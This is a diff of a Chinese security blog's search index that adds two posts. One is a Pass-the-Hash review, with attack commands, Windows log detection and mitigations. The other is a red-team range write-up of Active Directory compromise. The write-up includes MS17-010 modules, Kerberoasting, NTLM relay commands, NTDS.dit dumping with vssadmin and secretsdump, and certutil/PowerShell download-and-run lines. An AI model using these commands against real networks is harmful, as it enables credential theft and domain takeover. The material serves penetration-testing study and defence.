@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Pass The Hash [ 知识回顾 ]]]></title>
+    <url>%2F2019%2F04%2FPass%20The%20Hash%2F</url>
+    <content type="text"><![CDATA[这个[ 知识回顾 ]系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等； 0x00 前言在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。 0x01 Pass The Hash的原理 在windows系统中，通常会使用NTLM身份认证。 NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser) NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。 这个不是漏洞。 0x02 常用攻击方式 meterpreter 1use exploit/windows/smb/psexec_psh wmiexec 1wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:5a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@192.10.20.22 "whoami" Invoke-WMIExec 1Invoke-WMIExec -Target 192.10.20.22 -Domain rcoil.org -Username john -Hash 5a625b04e786347908fc5f5d8a26dad5 -Command "calc.exe" -verbose Invoke-SMBExec 1Invoke-SMBExec -Target 192.10.20.22 -Domain rcoil.org -Username john -Hash 5a625b04e786347908fc5f5d8a26dad5 -Command "calc.exe" -verbose mimikatz（Overpass-the-hash） 12privilege：：debugsekurlsa::pth /user:john /domain:rcoil.org /ntlm:5a625b04e786347908fc5f5d8a26dad5 CrackMapExec 1cme smb 192.10.20.22 -u john -H 5a625b04e786347908fc5f5d8a26dad5 -x whoami 0x03 如何检测由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。 1） 工作组日志事件 产生NTLM身份验证 日志ID 4648 查看登录信息 显示账户已经成功登陆 日志ID 4624 所有用户登录事件 在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。 日志ID 4672 分配给新登录的特权 SQLServer 机器 在192.168.1.104机器上查看，在4624事件上能明确看到登陆类型为3，即网络登陆。且登陆身份验证数据包为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户 2） 域控日志事件以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。 Source Host Target Host Domain Controller 4648 - 使用显式凭据尝试登录 4624 - 帐户已成功登录。登录类型3，NTLM 4768 - 请求了Kerberos身份验证票证（TGT） 4624 - 帐户已成功登录。登录类型2 4672 - 分配给新登录的特权 4769 - 请求了Kerberos服务票证 4672 - 分配给新登录的特权 4776 - 计算机尝试验证帐户的凭据 接下来看看Pass The Hash所产生的日志事件 3）Pass The Hash事件以下是我们在使用Pass-The-Hash执行NTLM身份验证时看到的日志摘要。 Source Host Target Host Domain Controller 4648 - 使用显式凭据尝试登录 4624 - 帐户已成功登录。登录类型3，NTLM 4776 - 计算机尝试验证帐户的凭据 4624 - 帐户已成功登录 （登录类型= 9 ,登录过程= Seclogo 4672 - 分配给新登录的特权 4672 - 分配给新登录的特权 （登录用户，而不是模拟用户） 自定义事件过滤器，可用于显示特定信息。 123456789101112131415161718192021&lt;QueryList&gt; &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt; &lt;Select Path=&quot;Security&quot;&gt; *[System[(EventID=&apos;4624&apos;)] and EventData[Data[@Name=&apos;LogonType&apos;]=&apos;9&apos;] and EventData[Data[@Name=&apos;LogonProcessName&apos;]=&apos;seclogo&apos;] and EventData[Data[@Name=&apos;AuthenticationPackageName&apos;]=&apos;Negotiate&apos;] ] &lt;/Select&gt; &lt;/Query&gt; &lt;Query Id=&quot;0&quot; Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt; &lt;Select Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt; *[System[(EventID=10)]] and *[EventData[Data[@Name=&apos;GrantedAccess&apos;] and (Data=&apos;0x1010&apos; or Data=&apos;0x1038&apos;)]]&lt;/Select&gt; &lt;/Query&gt;&lt;/QueryList&gt; 以上日志事件可自行验证。 VB代码为：&lt; https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt; 4） 要想放心，还是得买买买StealthDEFEND Real-Time Auditing for Active Directory 略…. 5）蜜罐部署https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/ https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/ https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/ https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x 略…. 0x04 缓解措施 域管账户只能访问域控制器，且强调最少用户访问的概念。 域控制器与其余敏感系统只能从可信的脱网环境进行访问。 使用双因素身份验证。 监控身份验证与异常登陆活动相关日志。 启用LSA保护。 手动添加注册表，取消明文存储（KB2871997补丁）： 1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 略…. 0x05 参考Pass the hash 从hash传递攻击谈相关Windows安全机制 Active Directory administrative tier model 如何检测Windows中的横向渗透攻击 HOW TO DETECT PASS-THE-HASH ATTACKS Pass-the-hash attacks: Tools and Mitigation]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[内网练习（四）- 知识梳理]]></title>
     <url>%2F2019%2F03%2F%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
     <content type="text"><![CDATA[环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。 分享便是我最好的老师。 ——Micropoor 0x00 前言在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。 目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。 提示：flag{ooxx-ooxx} 初始网络拓扑 0x01 靶机信息收集因为是模拟环境，所以初始权限为win7域用户权限（上了RAT–&gt;http协议）。 DKRST011的基本信息 12345678910机器名: DKRST011权限: 域用户权限(rcoil\tk001)系统: Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601 x64Domain: rcoil.localIP地址: 172.16.238.29杀软: McAfee(非最新版)补丁情况：[*240].NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作额为信息: 192.168.5.6:8080为内网代理服务 --&gt; Linux 在收集信息的时候发现TCP连接都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。 探测出网情况：此机器为半脱网情况，dns、icmp、udp均不可出来，http与https协议可出网。所有出网程序连接均为192.10.22.6:8080，由此初步判断为代理出网情况，且是http无限制出网。 通过对带有password等关键字眼的文件进行搜索拖取，当作储备。 内网存活探测 12345- ICMP- SMB 172.16.88.0/16 192.168.5.0/16.... 0x02 对域内信息进行获取从全盘文件列表中可看到setspn是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（socks代理），所以使用Cobalt Strike上线操作。 1）问题（均为RAT上运行） Cobalt Strike免杀问题； powerview运行无反应（powershell、C#）； Bloodhound/Sharphou运行无反应； setspn.exe 被删除。 2）方案 免杀shellcode，使用加载器运行，例子 ； Cobalt Strike的execute-assembly运行本地相应C#程序； 使用GetUserSPNs 替换setspn使用；1python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil 3）域信息的收集结果大致如下1234567域控： TTT-2_172.16.88.21_windows 2016 x64 (主域控) TTT-V_172.16.88.20_windows 2016 x64 (辅助域控) 域管理员：10+域用户：200+域内机器：150+其他：略.... 0x03 域控（域管理员）权限获取方法按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。 1） 常规方法及结果 组策略漏洞（GPP）–&gt; （MS14-025） 1234567方法： enum4linux -a -u tk001 -p P@ssw0rd 172.16.88.21 (数据收集) smbclient //172.16.88.21/SYSVOL -U tk001 或者使用msf auxiliary/scanner/smb/smb_enum_gpp[*] 结果： 失败（其实单单看是2016 server系统就知道不会成功） MS17-010 12345678[*]msf auxiliary/admin/smb/ms17_010_command auxiliary/scanner/smb/smb_ms17_010 exploit/windows/smb/ms17_010_eternalblue exploit/windows/smb/ms17_010_eternalblue_win8 exploit/windows/smb/ms17_010_psexec[*] 结果： TTT-V_172.16.88.20成功执行命令 Kerberoasting 1234567[*]GetUserSPNs.py python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil 关闭Kerberos预身份认证[*]Rubeus --&gt; https://github.com/GhostPack/Rubeus Rubeus.exe asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs[*] 结果: 失败 2） 主流方法及结果 基于资源约束委派(RBCD) –&gt; （未尝试） 123456[*] 条件：2012+域控制器[*] powermad[*] powerview[*] Rubeus[*] SharpAllowedToAct https://github.com/pkb1s/SharpAllowedToAct NTLM中继攻击（未尝试） 12345678[*] Responder windows版本：https://github.com/Kevin-Robertson/Inveigh（修改函数名绕杀软等方法） linux版本：https://github.com/SpiderLabs/Responder[*] mitm6+ntlmrelayx https://github.com/fox-it/mitm6 https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py[*] CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec Exchange （未启用Exchange） 1234567[*] Privexchange privexchange.py -ah 172.16.238.29 TTT-2.rcoil.local -u tk001 -d rcoil.local -p P@ssw0rd # Privexchange.py对echange进行API调用 ntlmrelayx.py -t ldap://172.16.88.21 --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限 secretsdump.py rcoil/tk001@TTT-2.rcoil.local -just-dc[*] Exchange2domain --&gt; 一体化的privexchange工具 https://github.com/Ridter/Exchange2domain 3） 辅助工具 BloodHound –&gt; 映射出活动目录关系 ADAPE-Script –&gt; AD评估和权限提升脚本 Invoke-PsUACme –&gt; 绕过UAC CrackMapExec –&gt; 查找特权帐户等等等利用 SILENTTRINITY –&gt; 后期利用 …. 除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、 123[*] powerviewFind-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt[*] 略.... 0x04 域控权限TTT-V_172.16.88.20使用MS17-010成功执行命令。 域控信息： 123456789101112机器名: TTT-V权限: 域控权限系统: Windows Server 2016 Standard 10.0.14393 N/A Build 14393 x64OS Configuration: Additional/Backup Domain ControllerDomain: rcoil.localIP地址: 172.16.88.20杀软: McAfee(非最新版)补丁情况：[*2].NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0端口情况：无Web --&gt; TTT-2_172.16.88.21存在80端口IIS服务域信任关系：rcoil.local（root） demo.rcoil.local 往下的思路是这样的： 123[*] 本机flag获取[*] 在TTT-V机器上拖取NTDS.dit文件，本地恢复获取域内所有用户hash。当然，能获取到明文是最好的。[*] 使用CrackMapExec、wmiexec等工具执行相关操作（重点：以域管权限启动CS，后使用PTH攻击 --&gt; 简直完美）。 1）实施 flag获取 123456[*] dir dir /s flag[*] powerview(可选) Invoke-Filefinder -Threads 100 -Verbose -Terms flag -IncludeC -OutFile C:\Windows\Temp\flags.txt flag&#123;Genius_only_means_hard-working_all_one&apos;s_life&#125; 直接反弹MS17-010的shell进行操作 12bind_tcp --&gt; 失败bind_pipe --&gt; 失败 IPC操作 1234[*] 不建议之操作 添加添加系统隐藏账号密码进行IPC一系列操作[*] 域管权限 直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问 NTDS.dit 12345678910vssadmin create shadow /for=c: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\NTDS.dit c:\windows\temp\ntds.dit copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM c:\windows\temp\system.hivevssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL域管理员的password为hash格式。后使用 CrackMapExec、wmiexec等工具进行进一步测试。 注：调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036 2）遇到问题执行以下命令：1wmiexec.py -hashes LMHASH:NTHASH rcoil/administrator@172.16.238.29 &quot;c:\\payload.exe&quot; Cobalt Strike未上线，这个情况其实是第一次见。 以多种形式的payload运行也无果。 确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。 3）方案 获取明文密码，计划任务启动； 添加HKLM自启注册表 0x05 获取域管明文密码使用powerview查询域管登陆过的机器：123# Find-DomainUserLocation == old Invoke-UserHunter# enumerate servers that allow unconstrained Kerberos delegation and show all users logged inFind-DomainUserLocation -ComputerUnconstrained -ShowAll 最后选择了172.16.10.29的win 2008 server的机器，而且这台机器上存在AdAudit Plus。 由于目前没有任何容器可提供文件传输，所以自建。 在DKRST011机器创建FTP或者Web服务； 12345678910111213141516import SimpleHTTPServerimport SocketServerimport sysPORT = 80if len(sys.argv) != 2: print(&quot;use: web.exe port&quot;)else: PORT = int(sys.argv[1]) Handler = SimpleHTTPServer.SimpleHTTPRequestHandler httpd = SocketServer.TCPServer((&quot;&quot;, PORT), Handler) print &quot;SimpleHTTPServer is &quot;, PORT print &quot;by k8gege&quot; httpd.serve_forever()来源：https://raw.githubusercontent.com/k8gege/K8tools/master/web.py 注：这类型操作也需要添加防火墙规则，防止弹窗netsh advfirewall firewall add rule name=&quot;web.exe&quot; dir=in program=&quot;c:\Users\Public\Downloads\web.exe&quot; action=allow 使用certutil、bitsadmin、powersehll等自带程序下载； 123[*] certutil -urlcache -split -f http://172.16.238.29/1.rar 2.rar[*] bitsadmin /rawreturn /transfer 任务名 http://172.16.238.29/1.rar 2.rar[*] powershell -WindowStyle Hidden &quot;IEX (New-Object Net.WebClient).DownloadFile(&apos;http://172.16.238.29/1.rar&apos;,&apos;c:\windows\temp\ 2.rar&apos;)&quot; 这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。 往下就是Procdump的一些操作，成功获取到明文密码。 1234[*] 高权限计划任务启动CS服务端，未上线。[*] 添加HKLM自启动，未上线。这是什么问题呢？（未解决） 0x05 其余flag获取从提示与目的来判断，剩下的2个flag位于demo.rcoil.local域的域控、域用户名为flagav的机器上。 flagav用户机器直接从AdAudit Plus获取到域用户flagav的登陆情况，这样就不用去翻日志了。使用CrackMapExec、wmiexec等工具执行命令查找flag： 1flag&#123;Cease_to_struggle_and_you_cease_to_live&#125; 子域域控flag 使用主域控的域管可直接登陆子域的域控 1flag&#123;Success_grows_out_of_struggles_to_overcome_difficulties&#125; 0x0x 最后的拓扑好多没去了解，就草草结束了。 免责声明：文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。]]></content>
@@ -61,8 +66,8 @@
       </categories>
       <tags>
         <tag>Tools</tag>
-        <tag>域渗透</tag>
         <tag>C#</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -96,8 +101,8 @@
         <category>编程之道</category>
       </categories>
       <tags>
-        <tag>C#</tag>
         <tag>tools</tag>
+        <tag>C#</tag>
       </tags>
   </entry>
   <entry>
@@ -154,8 +159,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>Web安全</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -234,8 +239,8 @@
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>系统安全</tag>
         <tag>内网</tag>
+        <tag>系统安全</tag>
         <tag>后门</tag>
       </tags>
   </entry>
@@ -260,8 +265,8 @@
       </categories>
       <tags>
         <tag>tools</tag>
-        <tag>系统安全</tag>
         <tag>内网</tag>
+        <tag>系统安全</tag>
       </tags>
   </entry>
   <entry>
@@ -272,8 +277,8 @@
         <category>编程之道</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>Web安全</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -308,8 +313,8 @@
       </categories>
       <tags>
         <tag>tools</tag>
-        <tag>系统安全</tag>
         <tag>内网</tag>
+        <tag>系统安全</tag>
       </tags>
   </entry>
   <entry>
